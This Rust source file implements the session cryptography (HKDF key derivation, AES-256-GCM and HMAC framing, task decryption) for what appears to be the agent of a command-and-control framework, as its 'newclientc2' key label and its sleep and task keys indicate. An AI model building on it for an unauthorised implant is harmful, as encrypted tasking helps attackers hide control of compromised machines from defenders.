use aes_gcm::{Aes256Gcm, KeyInit, Nonce, aead::Aead};
use hmac::Hmac;
use digest::Mac;
use sha2::{Sha256, Digest};
use rand::RngCore;

const KEY_SIZE: usize = 32;
const NONCE_SIZE: usize = 12;
const TAG_SIZE: usize = 16;
const SALT_SIZE: usize = 32;
const HKDF_INFO: &[u8] = b"newclientc2-v1-derivation";

pub struct SessionCrypto {
    traffic_key: [u8; KEY_SIZE],
    sleep_key:   [u8; KEY_SIZE],
    task_key:    [u8; KEY_SIZE],
    mac_key:     [u8; KEY_SIZE],
}

impl SessionCrypto {
    // Derive all 4 keys from PSK hex + agent salt hex — mirrors server's NewSessionCrypto
    pub fn derive(psk_hex: &str, salt_hex: &str) -> Option<Self> {
        let psk = hex_decode(psk_hex)?;
        if psk.len() != KEY_SIZE { return None; }
        let salt = hex_decode(salt_hex)?;
        if salt.len() != SALT_SIZE { return None; }

        // HKDF-Extract(salt, PSK)
        let prk = hkdf_extract(&salt, &psk);

        // HKDF-Expand(PRK, info, 128) → 4 × 32B keys
        let expanded = hkdf_expand(&prk, HKDF_INFO, 4 * KEY_SIZE)?;
        if expanded.len() < 128 { return None; }

        let mut traffic_key = [0u8; KEY_SIZE];
        let mut sleep_key   = [0u8; KEY_SIZE];
        let mut task_key    = [0u8; KEY_SIZE];
        let mut mac_key     = [0u8; KEY_SIZE];
        traffic_key.copy_from_slice(&expanded[0..32]);
        sleep_key.copy_from_slice(&expanded[32..64]);
        task_key.copy_from_slice(&expanded[64..96]);
        mac_key.copy_from_slice(&expanded[96..128]);

        Some(Self { traffic_key, sleep_key, task_key, mac_key })
    }

    // Encrypt agent→server: [4B cipher_len][12B nonce][ciphertext+tag]
    // Inner: [32B HMAC(plaintext)][plaintext] → encrypt with traffic key
    pub fn encrypt_to_server(&self, plaintext: &[u8]) -> Vec<u8> {
        // Layer 4: HMAC over plaintext
        let mac = compute_hmac(&self.mac_key, plaintext);
        let mut inner = vec![0u8; 32 + plaintext.len()];
        inner[..32].copy_from_slice(&mac);
        inner[32..].copy_from_slice(plaintext);

        // Layer 1: AES-256-GCM encrypt
        self.encrypt_traffic(&inner)
    }

    // Decrypt server→agent: [4B cipher_len][12B nonce][ciphertext+tag]
    // Returns plaintext (after MAC verification)
    pub fn decrypt_from_server(&self, wire: &[u8]) -> Option<Vec<u8>> {
        if wire.len() < 4 + NONCE_SIZE + TAG_SIZE { return None; }
        let cipher_len = u32::from_be_bytes([wire[0],wire[1],wire[2],wire[3]]) as usize;
        if wire.len() != 4 + NONCE_SIZE + cipher_len { return None; }

        let nonce_bytes = &wire[4..4+NONCE_SIZE];
        let ciphertext = &wire[4+NONCE_SIZE..];

        let nonce = Nonce::from_slice(nonce_bytes);
        let cipher = Aes256Gcm::new_from_slice(&self.traffic_key).ok()?;
        let decrypted = cipher.decrypt(nonce, ciphertext).ok()?;

        if decrypted.len() < 32 { return None; } // HMAC layer mandatory

        // Layer 4: verify MAC
        let mac_received = &decrypted[..32];
        let plaintext = &decrypted[32..];
        let mac_computed = compute_hmac(&self.mac_key, plaintext);
        if constant_eq(mac_received, &mac_computed) {
            Some(plaintext.to_vec())
        } else {
            None
        }
    }

    // Layer 3: decrypt task payload with task key
    pub fn decrypt_task(&self, ciphertext: &[u8], nonce: &[u8]) -> Option<Vec<u8>> {
        let nonce = Nonce::from_slice(nonce);
        let cipher = Aes256Gcm::new_from_slice(&self.task_key).ok()?;
        cipher.decrypt(nonce, ciphertext).ok()
    }

    // Traffic key encryption only (no MAC layer)
    // Uses random 12-byte nonce — matches server's EncryptToAgent.
    // Both sides use random nonces: symmetric, no nonce reuse risk.
    fn encrypt_traffic(&self, plaintext: &[u8]) -> Vec<u8> {
        let mut nonce_bytes = [0u8; NONCE_SIZE];
        rand::thread_rng().fill_bytes(&mut nonce_bytes);

        let nonce = Nonce::from_slice(&nonce_bytes);
        let cipher = Aes256Gcm::new_from_slice(&self.traffic_key)
            .expect("traffic key");
        let ct = cipher.encrypt(nonce, plaintext).expect("encrypt");

        let cipher_len = (ct.len() as u32).to_be_bytes();
        let mut out = Vec::with_capacity(4 + NONCE_SIZE + ct.len());
        out.extend_from_slice(&cipher_len);
        out.extend_from_slice(&nonce_bytes);
        out.extend_from_slice(&ct);
        out
    }

    pub fn task_key(&self) -> &[u8; KEY_SIZE] { &self.task_key }
    pub fn sleep_key(&self) -> &[u8; KEY_SIZE] { &self.sleep_key }
}

// HKDF-Extract: HMAC-SHA256(salt, IKM) — matches server's RFC 5869 behavior
fn hkdf_extract(salt: &[u8], ikm: &[u8]) -> Vec<u8> {
    let zero_salt: [u8; 32] = [0; 32];
    let effective_salt = if salt.is_empty() { &zero_salt[..] } else { salt };
    let mut mac: Hmac<Sha256> = <Hmac<Sha256> as KeyInit>::new_from_slice(effective_salt).expect("hmac");
    mac.update(ikm);
    mac.finalize().into_bytes().to_vec()
}

// HKDF-Expand: HMAC-SHA256 based expansion
fn hkdf_expand(prk: &[u8], info: &[u8], n: usize) -> Option<Vec<u8>> {
    if n > 255 * 32 { return None; }
    let blocks = (n + 31) / 32;
    let mut okm = Vec::with_capacity(n);
    let mut prev = Vec::new();
    for i in 1..=blocks {
        let mut mac: Hmac<Sha256> = <Hmac<Sha256> as KeyInit>::new_from_slice(prk).expect("hmac");
        mac.update(&prev);
        mac.update(info);
        mac.update(&[i as u8]);
        let t = mac.finalize().into_bytes().to_vec();
        let rem = n - okm.len();
        let take = if rem > 32 { 32 } else { rem };
        okm.extend_from_slice(&t[..take]);
        prev = t;
    }
    Some(okm)
}

fn compute_hmac(key: &[u8], data: &[u8]) -> [u8; 32] {
    let mut mac: Hmac<Sha256> = <Hmac<Sha256> as KeyInit>::new_from_slice(key).expect("hmac");
    mac.update(data);
    let result = mac.finalize().into_bytes();
    let mut out = [0u8; 32];
    out.copy_from_slice(&result);
    out
}

fn constant_eq(a: &[u8], b: &[u8]) -> bool {
    if a.len() != b.len() { return false; }
    a.iter().zip(b.iter()).fold(0u8, |acc, (&x, &y)| acc | (x ^ y)) == 0
}

pub fn psk_hash_hex(psk_hex: &str) -> String {
    let psk = match hex_decode(psk_hex) {
        Some(b) => b,
        None => return String::new(),
    };
    let hash = Sha256::digest(&psk);
    hex_encode(&hash)
}

pub fn generate_salt_hex() -> String {
    let mut salt = [0u8; SALT_SIZE];
    rand::thread_rng().fill_bytes(&mut salt);
    hex_encode(&salt)
}

pub fn hex_encode(data: &[u8]) -> String {
    data.iter().map(|b| format!("{:02x}", b)).collect()
}

pub fn hex_decode(s: &str) -> Option<Vec<u8>> {
    if s.len() % 2 != 0 { return None; }
    (0..s.len()).step_by(2)
        .map(|i| u8::from_str_radix(&s[i..i+2], 16).ok())
        .collect::<Option<Vec<u8>>>()
}
